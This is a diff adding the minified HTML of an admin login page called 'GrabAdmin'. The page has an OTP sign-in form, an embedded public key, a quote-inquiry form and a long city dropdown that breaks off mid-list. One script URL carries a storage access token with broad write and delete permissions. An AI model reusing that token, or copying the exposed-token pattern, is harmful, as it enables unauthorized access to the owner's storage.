@@ -1,0 +1,335 @@
+<!doctypehtml><html lang=en><meta charset=utf-8><title>GrabAdmin | Log In</title><meta content="Latest updates and statistic charts"name=description><meta content="IE=edge"http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1,shrink-to-fit=no"name=viewport><script src="https://grabprodcdn.grab.in/library/ajax.googleapis.com/ajax/libs/webfont/1.6.16/webfont.js?sv=2022-11-02&ss=b&srt=sco&sp=rwdlaciytfx&se=2030-12-31T15:43:01Z&st=2023-09-12T07:43:01Z&spr=https&sig=F2CWXOKR%2BohES8URqQARQ463PxcMEEJRhDf5kxsiTxI%3D"></script><script>WebFont.load({google:{families:["Poppins:300,400,500,600,700","Roboto:300,400,500,600,700"]},active:function(){sessionStorage.fonts=!0}})</script><style>.leftpad{padding-left:4px!important}@media(min-width:1200px){#comodoimg{margin-right:-30%}}@media (max-width:992px){.m-grid.m-grid--hor-tablet-and-mobile.m-grid--tablet-and-mobile>.m-grid__item.m-grid__item--order-tablet-and-mobile-1{order:2!important;padding-left:1rem!important;padding-right:1rem!important}.m-grid__item m-grid__item--order-tablet-and-mobile-2 m-login__aside{padding-left:0!important;padding-right:0!important}}input:-webkit-autofill{-webkit-box-shadow:0 0 0 30px #fff inset}input:-webkit-autofill{-webkit-text-fill-color:#9496a0!important}m-stack__item m-stack__item--fluid div.swal-text{padding-right:20px;padding-left:20px;text-align:center!important}.swal-title{font-size:18px!important}.hiddenbtn{display:none}.hidden{display:none}.swal-footer{text-align:center}.loader{border:10px solid #f3f3f3;border-radius:50%;border-top:10px solid #3498db;width:50px;height:50px;margin-left:40%;-webkit-animation:spin 2s linear infinite;animation:spin 2s linear infinite}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(360deg)}}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style><link href=https://cpanel.grab.in/metronic/assets/vendors/base/vendors.bundle.css rel=stylesheet><link href=https://cpanel.grab.in/metronic/assets/demo/default/base/style.bundle.css rel=stylesheet><link href=https://cpanel.grab.in/metronic/assets/demo/default/media/img/logo/favicon.ico rel="shortcut icon"><body class="m--skin- m-aside--offcanvas-default m-aside-left--enabled m-aside-left--offcanvas m-aside-left--skin-dark m-footer--push m-header--fixed m-header--fixed-mobile"><div class="m-grid m-grid--hor m-grid--root m-page"><div class="m-grid__item m-grid m-grid__item--fluid m-grid--desktop m-grid--hor-tablet-and-mobile m-grid--tablet-and-mobile m-grid--ver-desktop m-login m-login--1 m-login--singin"id=m_login><div class="m-grid__item m-grid__item--order-tablet-and-mobile-2 m-login__aside"style=background-image:url(https://cpanel.grab.in/metronic/assets/app/media/img/bg/bg-login-left.png)><div class="m-stack m-stack--desktop m-stack--hor"><div class="m-stack__item m-stack__item--fluid"><div class=m-login__wrapper style=padding-top:25%><div class=m-login__logo style=margin-bottom:2rem><a href=https://www.grab.in target=_blank><img src=https://cpanel.grab.in/metronic/assets/demo/default/media/img/logo/marker-alpha.png></a></div><div class=m-login__signin><div class=m-login__head><h3 class=m-login__title>Sign In</h3></div><form class="m-form m-login__form"action=/Admin/Index/index id=loginform name=loginform style=margin-top:2rem autocomplete=off method=post novalidate onsubmit=return!1><div class="form-group m-form__group"><input autocomplete=off autocomplete=new-username id=username class="form-control m-input"placeholder="Email ID"name=username required> <textarea cols=65 id=pubkey style=display:none rows=15>-----BEGIN PUBLIC KEY-----
+    MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDlOJu6TyygqxfWT7eLtGDwajtN
+    FOb9I5XRb6khyfD1Yt3YiCgQWMNW649887VGJiGr/L5i2osbl8C9+WJTeucF+S76
+    xFxdU6jE0NQ+Z+zEdhUTooNRaY5nZiu5PgDB0ED/ZKBUSLKL7eibMxZtMlUDHjm4
+    gwQco1KRMDSmXSMkDwIDAQAB
+    -----END PUBLIC KEY-----</textarea></div><div class="form-group m-form__group"><input autocomplete=one-time-code id=password class="form-control m-input"placeholder="Enter OTP"name=password required maxlength=10 size=10 style=display:none;-webkit-text-security:disc></div><div class="form-group m-form__group"><input autocomplete=one-time-code id=password_txt class="form-control m-input"placeholder="Enter OTP"name=password_txt required maxlength=10 size=10 style=display:none;-webkit-text-security:disc></div><div class="form-group m-form__group"><input autocomplete=off autocomplete=set-new-username id=setusername class="form-control m-input"placeholder="User Name"required style=display:none></div><div class="form-group m-form__group"><input autocomplete=off id=newpassword class="form-control m-input"placeholder=Password required style=display:none;-webkit-text-security:disc></div><div class="form-group m-form__group"><input autocomplete=one-time-code id=emailotp class="form-control m-input"placeholder="Enter OTP"required style=display:none;-webkit-text-security:disc maxlength=4 size=4></div><div class="m-login__form-sub row"></div><div class="hidden loader"></div><div class=m-login__form-action style="margin:2rem 0 2rem 0"><span class="btn m-btn m-btn--custom m-btn--pill btn-warning m-btn--air otpsent"onclick="return sentotponmail()">Send OTP</span> <span class="btn m-btn m-btn--custom m-btn--pill btn-warning m-btn--air verify"onclick="return veryfypassword()"style=display:none>Verify</span> <span class="btn m-btn m-btn--custom m-btn--pill btn-warning m-btn--air verifyemailotp"onclick="return veryfyemailid()"style=display:none>Verify & Register Email ID</span></div><div class="m-login__form-action hiddenbtn"style="margin:2rem 0 2rem 0"><button class="btn m-btn m-btn--custom m-btn--pill btn-warning m-btn--air"id=m_login_signin_submit onclick="return encrypt(),!1"type=button>Verify OTP</button></div></form></div><div class=m-login__signup><div class=m-login__head><h3 class=m-login__title>Submit Inquiry</h3><div class=m-login__desc>Enter your details to request a quote.</div></div><form class="m-form m-login__form"action=""id=inquiry_form name=inquiry_form style=margin-top:2rem><div class="form-group m-form__group"><input autocomplete=off id=inquirer_name class="form-control m-input leftpad"placeholder=Name name=inquirer_name></div><div class="form-group m-form__group"><input autocomplete=off id=inquirer_email class="form-control m-input leftpad"placeholder=Email name=inquirer_email></div><div class="form-group m-form__group"><input autocomplete=off id=inquirer_contact class="form-control m-input leftpad"placeholder="Contact Number"name=inquirer_contact onkeyup='/\D/g.test(this.value)&&(this.value=this.value.replace(/\D/g,""))'></div><div class="form-group m-form__group"><select autocomplete=off class="form-control m-input select_valid"id=inquirer_category name=inquirer_category style="margin:10px 0;padding:0;color:#9496a0"><option value="">Select Category<option value=1>Document Collection<option value=2>Ecommerce<option value=3>Food<option value=4>Grocery<option value=5>E-KYC<option value=6>Pharmacy<option value=7>Payment Collection<option value=8>Other</select></div><div class="form-group m-form__group"><select autocomplete=off class="form-control m-input select_valid"id=inquirer_city name=inquirer_city style="margin:10px 0;padding:0;color:#9496a0"><option value="">Select City<option value=877>Abohar<option value=580>Achalpur<option value=878>Adampur<option value=619>Adilabad<option value=286>Adoni<option value=879>Adra<option value=190>Agartala<option value=53>Agra<option value=6>Ahmedabad<option value=557>Ahmednagar<option value=328>Ajmer<option value=432>Akbarpur<option value=554>Akluj<option value=46>Akola<option value=577>Akot<option value=318>Alibagh<option value=880>Aligarh<option value=765>Alipur<option value=785>Alipurduar<option value=31>Allahabad<option value=96>Alleppey<option value=881>Aluva<option value=108>Alwar<option value=666>Amalapuram<option value=567>Amalner<option value=259>Ambajogai<option value=883>Ambala<option value=1025>Ambalakku<option value=719>Ambasamudram<option value=885>Ambegaon<option value=570>Ambejogai<option value=886>Ambika Kalna<option value=613>Ambikapur<option value=732>Ambur<option value=232>Amravati<option value=527>Amreli<option value=370>Amritsar<option value=445>Amroha<option value=247>Anakapalle<option value=663>Anakapalli<option value=887>Anand<option value=69>Ananthapur<option value=410>Anantnag<option value=888>Andal<option value=889>Angul<option value=579>Anjangaon<option value=529>Anjar<option value=140>Anpara<option value=725>Arakonam<option value=890>Arambagh<option value=727>Arani<option value=861>Araria<option value=891>Arcot<option value=618>Armur<option value=200>Arrah<option value=1107>Aruppukottai<option value=294>Asansol<option value=794>Ashoknagar<option value=1080>Asika<option value=759>Attingal<option value=422>Auraiya<option value=44>Aurangabad<option value=198>Aurangabadbihar<option value=892>Avinashi<option value=477>Azamagarh<option value=59>Azamgarh<option value=893>Badaun<option value=873>Baddi<option value=409>Badgam<option value=643>Badvel<option value=854>Bagaha<option value=241>Bagalkot<option value=342>Bahadurgarh<option value=789>Baharampur<option value=440>Baheri<option value=474>Bahraich<option value=335>Balangir<option value=264>Balasore<option value=801>Balesore<option value=109>Ballia<option value=512>Balotra<option value=473>Balrampur<option value=428>Banda<option value=12>Banglore<option value=895>Bankura<option value=501>Banswara<option value=652>Bapatla<option value=500>Bara<option value=433>Barabanki<option value=139>Baramati<option value=411>Baramula<option value=856>Barauni<option value=896>Baraut<option value=1081>Barbil<option value=547>Bardoli<option value=897>Bareilly<option value=810>Bargarh<option value=898>Baripada<option value=511>Barmer<option value=386>Barnala<option value=980>Baroda<option value=815>Barpeta<option value=770>Barrackpore<option value=350>Barwala<option value=696>Basavakalyan<option value=796>Basirhat<option value=231>Basmat<option value=596>Basoda<option value=372>Batala<option value=387>Bathinda<option value=75>Bavla<option value=489>Beawar<option value=315>Beed<option value=855>Begusarai<option value=435>Bela Pratapgarh<option value=269>Belgaum<option value=622>Bellampalle<option value=238>Bellary<option value=900>Belthangady<option value=677>Bengaluru Do Not Select<option value=236>Berhampore<option value=806>Berhampur<option value=80>Bettiah<option value=592>Betul<option value=431>Bhadohi<option value=170>Bhadrak<option value=101>Bhadravathi<option value=575>Bhadravati<option value=839>Bhagalpur<option value=573>Bhandara<option value=902>Bharatpur<option value=73>Bharuch<option value=609>Bhatapara<option value=274>Bhatinda<option value=1104>Bhavani<option value=273>Bhavnagar<option value=809>Bhawanipatna<option value=903>Bhilai<option value=295>Bhilwara<option value=244>Bhimavaram<option value=1119>Bhind<option value=327>Bhiwadi<option value=354>Bhiwani<option value=630>Bhongir<option value=42>Bhopal<option value=798>Bhubaneshwar<option value=131>Bhubaneswar<option value=528>Bhuj<option value=47>Bhusawal<option value=598>Biaora<option value=175>Bidar<option value=833>Bihar Sharif<option value=203>Bihta<option value=271>Bijapur<option value=454>Bijnor<option value=293>Bikaner<option value=1042>Bilaspur<option value=548>Bilimora<option value=470>Bisalpur<option value=167>Bishnupur<option value=905>Biswanath Chariali<option value=192>Bitmesra<option value=673>Bobbili<option value=309>Bodhan<option value=906>Boisar<option value=196>Bokaro<option value=278>Bolangir<option value=235>Bolpur<option value=211>Bongaigaon<option value=166>Bongaon<option value=543>Borsad<option value=525>Botad<option value=907>Brahmavar<option value=812>Brajarajnagar<option value=442>Budaun<option value=908>Budbud<option value=1082>Buguda<option value=416>Bulandshahr<option value=316>Buldhana<option value=498>Bundi<option value=928>Burdwan<option value=583>Burhanpur<option value=605>Burhar<option value=832>Buxar<option value=909>Cachar<option value=87>Calicut<option value=910>Canacona<option value=795>Canning<option value=763>Central Avenue<option value=851>Chaibasa<option value=787>Chakdaha<option value=565>Chalisgaon<option value=681>Chamrajnagar<option value=894>Chandannagar<option value=448>Chandausi<option value=600>Chanderi<option value=32>Chandigarh<option value=455>Chandpur<option value=911>Chandrakona<option value=129>Chandrapur<option value=912>Chandwad<option value=754>Changanserry<option value=676>Channapatna<option value=913>Channarayap<option value=85>Chapra<option value=355>Charkhi Dadri<option value=914>Charumood<option value=869>Chatra<option value=55>Chennai<option value=756>Cherthala<option value=915>Chhatarpur<option value=916>Chhatrapur<option value=425>Chhibramau<option value=917>Chhindwara<option value=706>Chidambaram<option value=674>Chik Ballapur<option value=338>Chikali<option value=684>Chikmagalur<option value=658>Chilakalurupet<option value=679>Chintamani<option value=660>Chirala<option value=849>Chirkunda<option value=614>Chirmiri<option value=103>Chitradurga<option value=492>Chittaurgarh<option value=301>Chittoor<option value=336>Chittorgarh<option value=745>Chittur<option value=486>Chomu<option value=566>Chopda<option value=1093>Churu<option value=973>Cochin<option value=147>Coimbatore<option value=777>Contai<option value=918>Cooch Behar<option value=784>Coochbehar<option value=1106>Coonoor<option value=281>Cuddalore<option value=168>Cuttack<option value=919>Cuttak<option value=546>Dabhoi<option value=419>Dadri<option value=920>Dahej<option value=544>Dahod<option value=1002>Dakshina<option value=197>Daltonganj<option value=92>Damoh<option value=921>Danapur<option value=204>Darbhanga<option value=783>Darjeeling<option value=904>Daruhera<option value=922>Daspur<option value=375>Dasua<option value=601>Datia<option value=485>Dausa<option value=292>Dava<option value=923>Davanagere<option value=100>Davangere<option value=924>Debagram<option value=540>Deesa<option value=180>Deglur<option value=41>Dehradun<option value=845>Dehri<option value=925>Dehri On<option value=7>Delhi<option value=460>Deoband<option value=841>Deoghar<option value=926>Deoria<option value=366>Dera Bassi<option value=213>Dergaon<option value=927>Devanahalli<option value=929>Dewas<option value=457>Dhampur<option value=610>Dhamtari<option value=195>Dhanbad<option value=586>Dhar<option value=1136>Dharamgarh<option value=931>Dharampuri<option value=930>Dharamsala<option value=865>Dharmanagar<option value=207>Dharmapuri<option value=639>Dharmavaram<option value=871>Dharmshala<option value=932>Dharwad<option value=502>Dhaulpur<option value=824>Dhemaji<option value=803>Dhenkanal<option value=533>Dholka<option value=521>Dhrangadhra<option value=214>Dhubri<option value=564>Dhule<option value=384>Dhuri<option value=215>Dibrugarh<option value=821>Digboi<option value=830>Dimapur<option value=156>Dindigul<option value=933>Doddaballapur<option value=934>Domkol<option value=935>Dudhnoi<option value=822>Duliajan<option value=840>Dumka<option value=494>Dungarpur<option value=767>Dunlop<option value=1100>Durg<option value=299>Durgapur<option value=882>East Godavari<option value=751>Edapally<option value=347>Ellenabad<option value=1102>Eloor<option value=249>Eluru<option value=780>English Bazer Malda<option value=172>Ernakulam<option value=179>Erode<option value=141>Etawah<option value=937>Etwah<option value=176>Faizabad<option value=791>Farakka<option value=27>Faridabad<option value=390>Faridkot<option value=441>Faridpur<option value=938>Farraka<option value=939>Farrukhabad<option value=424>Farrukhabad-cum-fatehgarh<option value=345>Fatehabad<option value=944>Fatehgarh Sahib<option value=505>Fatehpur<option value=397>Fazilka<option value=940>Ferozepur<option value=149>Firozabad<option value=392>Firozpur<option value=393>Firozpur Cantt.<option value=257>Forbesganj<option value=691>Gadag-betigeri<option value=320>Gadchiroli<option value=635>Gadwal<option value=1141>Gajwel<option value=356>Ganaur<option value=530>Gandhidham<option value=9>Gandhinagar<option value=427>Gangaghat<option value=331>Ganganagar<option value=495>Gangapur City<option value=781>Gangarampur<option value=272>Gangavathi<option value=693>Gangawati<option value=1135>Gangtok<option value=942>Garhwa<option value=256>Gaya<option value=359>Gharaunda<option value=413>Ghaziabad<option value=436>Ghazipur<option value=396>Gidderbaha<option value=842>Giridih<option value=36>Goa<option value=216>Goalpara<option value=943>Gobichettipal<option value=733>Gobichettipalayam<option value=381>Gobindgarh<option value=1099>Godavarikhani<option value=945>Godda<option value=946>Godhra<option value=1116>Gogamukh<option value=357>Gohana<option value=699>Gokak<option value=217>Golaghat<option value=471>Golagokarnnath<option value=177>Gonda<option value=947>Gondal<option value=572>Gondia<option value=64>Gopalganj<option value=40>Gorakhpur<option value=651>Gudivada<option value=729>Gudiyatham<option value=661>Gudur<option value=162>Gulbarga<option value=852>Gumla<option value=948>Gummidipoondi<option value=949>Guna<option value=640>Guntakal<option value=250>Guntur<option value=1087>Gunupur<option value=950>Gurap<option value=373>Gurdaspur<option value=8>Gurgaon<option value=1127>Gurugram<option value=951>Gurusahaiganj<option value=747>Guruvayoor<option value=152>Guwahati<option value=91>Gwalior<option value=165>Habra<option value=952>Haflong<option value=1073>Haijpur<option value=155>Hajipur<option value=953>Haldia<option value=277>Haldwani<option value=472>Haldwani-cum-kathgodam<option value=872>Hamirpur<option value=253>Hanamkonda<option value=628>Hannumakonda<option value=344>Hansi<option value=308>Hanumangarh<option value=452>Hapur<option value=595>Harda<option value=437>Hardoi<option value=463>Hardwar<option value=121>Haridwar<option value=686>Harihar<option value=191>Harmu<option value=446>Hasanpur<option value=230>Hassan<option value=687>Haveri<option value=846>Hazaribag<option value=199>Hazaribagh<option value=954>Himmatnagar<option value=496>Hindaun<option value=636>Hindupur<option value=574>Hinganghat<option value=239>Hingoli<option value=343>Hisar<option value=66>Hissar<option value=955>Hojai<option value=326>Hooghly<option value=956>Hoshangabad<option value=957>Hoshiarpur<option value=692>Hospet<option value=187>Hosur<option value=218>Howly<option value=164>Howrah<option value=163>Hubli<option value=958>Hunsur<option value=959>Huzur<option value=24>Hyderabad<option value=960>Ibrahimpatnam<option value=144>Ichalkaranji<option value=961>Idappadi<option value=535>Ider<option value=827>Imphal<option value=206>Indapur<option value=38>Indore<option value=226>Islampur<option value=228>Itanagar<option value=594>Itarsi<option value=88>Jabalpur<option value=611>Jagdalpur<option value=649>Jaggaiahpet<option value=369>Jagraon<option value=962>Jagtai<option value=627>Jagtial<option value=420>Jahangirabad<option value=963>Jaigaon<option value=29>Jaipur<option value=513>Jaisalmer<option value=279>Jajpurroad<option value=394>Jalalabad<option value=964>Jalalpur<option value=275>Jalandhar<option value=483>Jalaun<option value=1083>Jaleswar<option value=112>Jalgaon<option value=50>Jalna<option value=333>Jalpaiguri<option value=314>Jammu<option value=77>Jamnagar<option value=128>Jamshedpur<option value=1088>Jamtara<option value=838>Jamui<option value=1096>Jangaon<option value=965>Jangareddygudem<option value=792>Jangipur<option value=589>Jaora<option value=1139>Jaraka<option value=966>Jasdan<option value=797>Jatani<option value=124>Jaunpur<option value=836>Jehanabad<option value=514>Jetpur<option value=967>Jeypore<option value=807>Jeypur<option value=104>Jhajjar<option value=1134>Jhalawar<option value=321>Jhansi<option value=778>Jhargram<option value=968>Jharia<option value=811>Jharsuguda<option value=969>Jhumri Telaiya<option value=847>Jhumri Tilaiya<option value=201>Jhumritelaiya<option value=970>Jhunjhunu<option value=507>Jhunjhunun<option value=125>Jind<option value=1133>Jl<option value=58>Jodhpur<option value=769>Joka<option value=220>Jorhat<option value=826>Jowai<option value=971>Junagadh<option value=113>Junnar<option value=284>Kadapa<option value=750>Kadavanthara<option value=638>Kadiri<option value=623>Kaghaznagar<option value=972>Kaikalur<option value=461>Kairana<option value=361>Kaithal<option value=282>Kakinada<option value=752>Kalamaserry<option value=351>Kalanwali<option value=1097>Kalimpong<option value=360>Kalka<option value=534>Kalol<option value=974>Kamakhayanagar<option value=1084>Kamakhyanagar<option value=768>Kamalgazi<option value=617>Kamareddy<option value=716>Kambam<option value=571>Kamptee<option value=726>Kancheepuram<option value=975>Kanchipuram<option value=790>Kandi<option value=976>Kandra<option value=659>Kandukur<option value=403>Kangra<option value=741>Kanhangad<option value=977>Kanke<option value=978>Kannad<option value=426>Kannauj<option value=1065>Kannur<option value=30>Kanpur<option value=194>Kantatoli<option value=377>Kapurthala<option value=94>Karad<option value=979>Karaikudi<option value=578>Karanja<option value=497>Karauli<option value=825>Karimganj<option value=254>Karimnagar<option value=298>Karnal<option value=981>Karumatampa<option value=303>Karur<option value=689>Karwar<option value=159>Kasaragod<option value=982>Kasargod<option value=766>Kasba<option value=423>Kasganj<option value=449>Kashipur<option value=406>Kathua<option value=860>Katihar<option value=405>Katra<option value=848>Katras<option value=983>Katwa<option value=662>Kavali<option value=98>Kayamkulam<option value=800>Kendrapara<option value=802>Kendujhar<option value=517>Keshod<option value=857>Khagaria<option value=545>Khambhat<option value=319>Khamgao<option value=581>Khamgaon<option value=289>Khammam<option value=1118>Khandwa<option value=367>Khanna<option value=776>Kharagpur<option value=584>Khargone<option value=467>Khatauli<option value=984>Kheri<option value=985>Khopoli<option value=986>Khoyrasol<option value=987>Khunti<option value=1085>Khurda<option value=417>Khurja<option value=456>Kiratpur<option value=862>Kishanganj<option value=488>Kishangarh<option value=465>Kithaur<option value=97>Kochi<option value=631>Kodad<option value=1111>Kodungallur<option value=831>Kohima<option value=193>Kokar<option value=818>Kokrajhar<option value=775>Kolaghat<option value=57>Kolhapur<option value=54>Kolhapurold<option value=49>Kolkata<option value=160>Kollam<option value=682>Kollegal<option value=484>Konch<option value=772>Konnagar<option value=563>Kopargaon<option value=258>Koppal<option value=322>Koraput<option value=988>Korba<option value=479>Kosi Kalan<option value=389>Kot Kapura<option value=33>Kota<option value=629>Kothagudem<option value=99>Kottarakkara<option value=86>Kottayam<option value=989>Kotulpur<option value=724>Kovilpatti<option value=143>Kozhikode<option value=866>Krishnagiri<option value=730>Krishnakir<option value=107>Krishnanagar<option value=762>Kulathoor<option value=402>Kullu<option value=1125>Kumaramangalam<option value=710>Kumbakonam<option value=748>Kunnamkulam<option value=991>Kuppam<option value=266>Kurnool<option value=875>Kurukshetra<option value=992>Kushalnagar<option value=468>Laharpur<option value=224>Lakhimpur<option value=233>Lakhisarai<option value=994>Lalgola<option value=995>Lalitpur<option value=221>Lanka<option value=262>Latur<option value=996>Lohardaga<option value=553>Lonavala<option value=25>Lucknow<option value=51>Ludhiana<option value=817>Lumding<option value=829>Lunglei<option value=648>Machhlipatnam<option value=287>Madanapalle<option value=997>Madanapallee<option value=137>Maddur<option value=65>Madhubani<option value=998>Madhupur<option value=680>Madikeri<option value=150>Madurai<option value=999>Mahaboobnagar<option value=1095>Mahabubabad<option value=1126>Mahabubnagar<option value=136>Mahad<option value=475>Maharajganj<option value=310>Mahbubnagar<option value=341>Mahendragarh<option value=429>Mahoba<option value=524>Mahuva<option value=421>Mainpuri<option value=510>Makrana<option value=95>Malappuram<option value=936>Malda<option value=48>Malegaon<option value=383>Malerkotla<option value=576>Malkapur<option value=1000>Malumichampatti<option value=1001>Manahavadey<option value=62>Manali<option value=118>Manchar<option value=621>Mancherial<option value=667>Mandapeta<option value=400>Mandi<option value=348>Mandi Dabwali<option value=603>Mandla<option value=590>Mandsaur<option value=138>Mandya<option value=656>Mangalagiri<option value=819>Mangaldoi<option value=37>Mangalore<option value=518>Mangrol<option value=899>Manipal<option value=561>Manmad<option value=711>Mannargudi<option value=391>Mansa<option value=1030>Mapusa<option value=551>Margao<option value=1117>Margherita<option value=864>Markapuram<option value=115>Mathura<option value=93>Mau<option value=476>Mau Nath Bhajan<option value=707>Mayiladuthurai<option value=774>Medinipur<option value=464>Meerut<option value=183>Mehkar<option value=74>Mehsana<option value=737>Mele Chowa<option value=1128>Metpally<option value=585>Mhow<option value=311>Miryalaguda<option value=632>Miryalguda<option value=67>Mirzapur<option value=536>Modasa<option value=414>Modinagar<option value=368>Moga<option value=1122>Mohali<option value=835>Mokameh<option value=189>Moloynagar<option value=1003>Moradabad<option value=223>Moranhat<option value=76>Morbi<option value=1004>Morena<option value=816>Morigaon<option value=522>Morvi<option value=78>Motihari<option value=1005>Motikhavdi<option value=1006>Mugalsarai<option value=132>Mughalsarai<option value=395>Muktsar<option value=1>Mumbai<option value=531>Mundra<option value=153>Munger<option value=1007>Murad Nagar<option value=415>Muradnagar<option value=297>Murtizapur<option value=604>Murwara<option value=1008>Mutil<option value=755>Muvattupuzha<option value=466>Muzaffarnagar<option value=853>Muzaffarpur<option value=34>Mysore<option value=788>Nabadwip<option value=380>Nabha<option value=541>Nadiad<option value=171>Nagaon<option value=709>Nagapattinam<option value=509>Nagaur<option value=588>Nagda<option value=1108>Nagercoil<option value=458>Nagina<option value=45>Nagpur<option value=793>Naihati<option value=1009>Najibabad<option value=374>Nakodar<option value=184>Nalbari<option value=805>Nalco<option value=290>Nalgonda<option value=302>Namakkal<option value=1094>Namchi<option value=68>Nanded<option value=876>Nandigama<option value=1121>Nandurbar<option value=646>Nandyal<option value=364>Nangal<option value=174>Nanjangud<option value=1010>Nanpara<option value=672>Narasapuram<option value=657>Narasaraopet<option value=340>Narnaul<option value=606>Narsinghapur<option value=353>Narwana<option value=43>Nashik<option value=3>Navi Mumbai<option value=837>Nawada<option value=506>Nawalgarh<option value=376>Nawanshahr<option value=1011>Nayagarh<option value=225>Nazira<option value=1098>Nazirpur<option value=761>Nedumangadu<option value=591>Neemuch<option value=285>Nellore<option value=705>Neyveli<option value=760>Neyyatinkara<option value=1012>Neyyattinkara<option value=1101>Nilgiris<option value=1086>Nimapada<option value=698>Nipani<option value=1013>Nirjuli<option value=620>Nirmal<option value=1014>Nirsa<option value=267>Nizamabad<option value=10>Noida<option value=1015>Noonmati<option value=823>North Lakhimpur<option value=650>Nuzvidu<option value=142>Obra<option value=243>Ongole<option value=736>Ootacamund Udhagamandalam<option value=482>Orai<option value=227>Osmanabad<option value=1124>Padmanabhpur<option value=1016>Padrauna<option value=1017>Pala<option value=291>Palakkad<option value=671>Palakollu<option value=870>Palampur<option value=1109>Palani<option value=1018>Palanpur<option value=130>Palghar<option value=490>Pali<option value=523>Palitana<option value=1019>Pallvadam<option value=123>Palwal<option value=307>Palwancha<option value=550>Panaji<option value=114>Panchkula<option value=555>Pandharpur<option value=169>Panikoili<option value=296>Panipat<option value=607>Panna<option value=704>Panruti<option value=1020>Paonta Sahib<option value=874>Paontasahib<option value=799>Paradip<option value=329>Paraganas<option value=715>Paramakudi<option value=602>Parasia<option value=158>Parbhani<option value=764>Parkstreet<option value=1138>Parlakhemundi<option value=569>Parli<option value=1021>Parli Vaijinath<option value=746>Parvattani<option value=863>Parwanoo<option value=1022>Pasighat<option value=538>Patan<option value=1023>Pathanamita<option value=106>Pathanamthitta<option value=378>Pathankot<option value=1024>Pathsala<option value=276>Patiala<option value=61>Patna<option value=712>Pattukkottai<option value=740>Payyanur<option value=624>Peddapalle<option value=668>Peddapuram<option value=363>Pehowa<option value=1026>Perambalur<option value=753>Perumbavoor<option value=542>Petlad<option value=1027>Phagwara<option value=559>Phaltan<option value=1089>Phulbani<option value=850>Phusro<option value=653>Piduguralla<option value=1028>Pilani<option value=469>Pilibhit<option value=453>Pilkhuwa<option value=587>Pithampur<option value=669>Pithapuram<option value=208>Pondicherry<option value=1029>Ponnur<option value=654>Ponnuru<option value=516>Porbanadar<option value=1031>Prodattur<option value=642>Proddatur<option value=714>Pudukkottai<option value=757>Punalur<option value=5>Pune<option value=1090>Purbamedinipur<option value=146>Puri<option value=234>Purnia<option value=1032>Purulia<option value=1033>Pusad<option value=742>Puthiyara<option value=1034>Puttur<option value=697>Rabkavi Banhatti<option value=1035>Radhanpur<option value=1137>Raghunathpur<option value=270>Raichur<option value=145>Raigad<option value=782>Raiganj<option value=612>Raigarh<option value=56>Raipur<option value=814>Rairangpur<option value=242>Rajahmundry<option value=1036>Rajam<option value=665>Rajamundry<option value=718>Rajapalayam<option value=771>Rajarhat Saltlake<option value=1132>Rajgarh<option value=834>Rajgir<option value=1037>Rajgurunagar<option value=28>Rajkot<option value=608>Rajnandgan<option value=407>Rajouri<option value=1038>Rajpura<option value=493>Rajsamand<option value=526>Rajula<option value=625>Ramagundam<option value=675>Ramanagaram<option value=1039>Ramanath<option value=1040>Rambagh<option value=202>Ramgarh<option value=450>Ramnagar<option value=451>Rampur<option value=388>Rampura Phul<option value=779>Rampurhat<option value=786>Ranaghat<option value=263>Ranchi<option value=324>Rangareddy<option value=688>Ranibennur<option value=728>Ranipet<option value=1041>Rasipuram<option value=430>Rath<option value=1043>Ratlam<option value=135>Ratnagiri<option value=205>Raxaul<option value=644>Rayachoti<option value=641>Rayadurg<option value=323>Rayagada<option value=1044>Raygada<option value=148>Renukoot<option value=1045>Repalle<option value=105>Revari<option value=90>Rewa<option value=1046>Rewari<option value=462>Rishikesh<option value=678>Robertson Pet<option value=317>Roha<option value=110>Rohtak<option value=122>Roorkee<option value=133>Rourkela<option value=334>Rudrapur<option value=261>Rupnagar<option value=352>Safidon<option value=1047>Saharanpur<option value=859>Saharsa<option value=443>Sahaswan<option value=843>Sahibganj<option value=1048>Sahjanwa<option value=268>Salem<option value=358>Samalkha<option value=379>Samana<option value=79>Samastipur<option value=265>Sambahlpur<option value=1049>Sambalpur<option value=447>Sambhal<option value=560>Sangamner<option value=313>Sangareddy<option value=111>Sangli<option value=382>Sangrur<option value=720>Sankarankoil<option value=503>Sardarshahar<option value=593>Sarni<option value=459>Sarsawa<option value=1112>Sarsehri<option value=209>Sarupathar<option value=844>Sasaram<option value=60>Satara<option value=1050>Sathupally<option value=89>Satna<option value=655>Sattenapalle<option value=499>Sawai Madhopur<option value=695>Shahabad Ka<option value=438>Shahabad Up<option value=1051>Shahada<option value=1113>Shahbad<option value=1052>Shahdol<option value=597>Shajapur<option value=337>Shegaon<option value=117>Sheohar<option value=480>Shikohabad<option value=330>Shillong<option value=398>Shimla<option value=685>Shimoga<option value=562>Shirdi<option value=568>Shirpur-warwade<option value=102>Shivamogga<option value=1053>Shivpuri<option value=556>Shrirampur<option value=210>Sibsagar<option value=312>Siddipet<option value=418>Sikandrabad<option value=1054>Sikar<option value=332>Silchar<option value=237>Siliguri<option value=70>Silvasa<option value=1055>Silvassa<option value=694>Sindhnur<option value=1129>Sindhudurg<option value=1105>Singanallur<option value=1056>Singrauli<option value=1115>Sinnar<option value=365>Sirhind Fategarh Sahib<option value=491>Sirohi<option value=1140>Sirpur<option value=346>Sirsa<option value=690>Sirsi<option value=626>Sirsilla<option value=81>Sitamarhi<option value=116>Sitapur<option value=1058>Sivakasi<option value=154>Siwan<option value=339>Sohna<option value=84>Solan<option value=127>Solapur<option value=1074>Somnath<option value=212>Sonari<option value=1059>Sonbhadra<option value=260>Sonipat<option value=412>Sopore<option value=758>Sreekanteswaram<option value=645>Sri Kalahasti<option value=1060>Sriganganagar<option value=246>Srikakulam<option value=1061>Srikalahasti<option value=408>Srinagar<option value=700>Sriperumpathur<option value=1062>Srirangapatna<option value=504>Sujangarh<option value=434>Sultanpur<option value=808>Sunabeda<option value=385>Sunam<option value=813>Sundargarh<option value=401>Sundernagar<option value=858>Supaul<option value=26>Surat<option value=508>Suratgarh<option value=1063>Surendranagar<option value=1057>Suri<option value=633>Suryapet<option value=670>Tadepallegudam<option value=306>Tadepalligudem<option value=637>Tadipatri<option value=804>Talcher<option value=739>Taliparambu<option value=1064>Tamluk<option value=615>Tandur<option value=325>Tanuku<option value=773>Tarakeshwar<option value=371>Tarantarn<option value=549>Tarapur<option 